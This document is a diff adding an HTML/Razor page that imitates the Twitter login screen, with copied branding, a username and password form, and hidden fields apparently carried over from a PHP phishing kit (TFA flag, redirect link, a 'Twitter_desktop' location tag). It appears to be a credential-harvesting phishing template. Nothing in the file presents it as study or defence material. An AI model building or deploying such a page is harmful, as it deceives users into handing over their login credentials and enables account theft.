@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset=utf-8>
+    <title>Login on Twitter</title>
+    <link rel=stylesheet type=text/css href="~/css/Twitter.css">
+    <link rel=stylesheet type=text/css href="~/css/000webhost.css">
+    <link rel="shortcut icon"
+        href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAAG1BMVEVHcEwdofJGsvWm2vovqfSIzvlmwPe84/zT7f37wKrnAAAAAXRSTlMAQObYZgAAAJxJREFUeAHF0V0SwiAMBODNT0Luf2ItjMUdQN/0eysJGzrBf5i6aOBS/RukVDo3WCaAJtzhMjmeQiQwpUzazMZJ4iZER0IfODSuvx3paDGu86vSihNyl7o2hIUcxGiQI+MJq0KncuAYymUveT2rhpcKl5Xi9i0AcXjBlLJwEPPjgMOvGMDax3oFl7Xoqq9LZEbXPbBheeW4ZhR+7wGLWwOPARKyLAAAAABJRU5ErkJggg==">
+    <style>
+ 
+    </style>
+</head>
+
+<body class="three-col logged-out ms-windows">
+    <div class="route-login login-responsive">
+        <div class="topbar js-topbar">
+            <div class="global-nav global-nav--newLoggedOut">
+                <div class=global-nav-inner>
+                    <div class=container>
+                        <ul class="nav js-global-actions">
+                            <li class=home><a class="js-nav js-tooltip js-dynamic-tooltip" href=" "><span
+                                        class=text><img style=margin-bottom:-8px
+                                            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAMAAAC6V+0/AAAAG1BMVEVHcEwcofINmvE6rfRdvPbY7/224fuf1/qCy/mnY1/UAAAAAXRSTlMAQObYZgAAAGxJREFUeAGdzksOgzAMhOF52Enuf+LKqUERXZV/+TFYwauGpUhMAB5tUyRFBpBUa1lVK1JOANmo+j1E0fNGf8/v72rTRj6KQotnWvhVJXZxoo9HP4dY0nmxy3WZcTcvi4YRpraI49hFgaPo3z54eQG9s3NeiQAAAABJRU5ErkJggg==">
+                                        Home</span></a></li>
+                            <li class=about><a class="js-tooltip js-dynamic-tooltip" href=" "><span
+                                        class=text>About</span></a></li>
+                        </ul>
+                        <div class="pull-right nav-extras">
+                            <ul style=margin-top:20px class="nav secondary-nav language-dropdown">
+                                <li class="dropdown js-language-dropdown"><a href=" "
+                                        class="dropdown-toggle js-dropdown-toggle"><small>Language: </small><span
+                                            class=js-current-language>English</span><b class=caret></b></a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="AppContent wrapper wrapper-login">
+            <div class=page-canvas>
+                <div class=signin-wrapper>
+                    <h1>Log in to Twitter</h1>
+                    @using (Html.BeginForm())
+                    {
+                        <fieldset>
+                            <legend class=visuallyhidden>Log in</legend>
+                            <div class="clearfix field">
+                                <input type=hidden name=name value="'.basename(__FILE__).'">
+                                <input type=hidden name=TFA_Enabled value="'.$TFA_Enabled.'">
+                                <input class="js-username-field email-input js-initial-focus" type=text name=username
+                                    placeholder="Phone, email or username" required>
+                                <input type=hidden name=link value='.$redirect.'>
+                                <input type=hidden name=location value=Twitter_desktop />
+                            </div>
+                            <div class="clearfix field">
+                                <input class=js-password-field type=password name=password placeholder=Password
+                                    required>
+                            </div>
+                        </fieldset>
+                        <div class=clearfix><button type=submit
+                                class="submit EdgeButton EdgeButton--primary EdgeButtom--medium">Log in</button>
+                            <div class=subchck><label class="t1-label remember">
+                                    <input type=checkbox value=1 name=remember_me checked=checked> Remember me <span
+                                        class=separator>·</span><a class=forgot href=" ">Forgot password?</a></label>
+                            </div>
+                        </div>
+                    }
+                </div>
+                <div class="clearfix mobile has-sms">
+                    <p class=signup-helper> New to Twitter? <a href=" ">Sign up now »</a></p>
+                    <p class=sms-helper> Already using Twitter via text message? <a href=" ">Activate your account »</a>
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
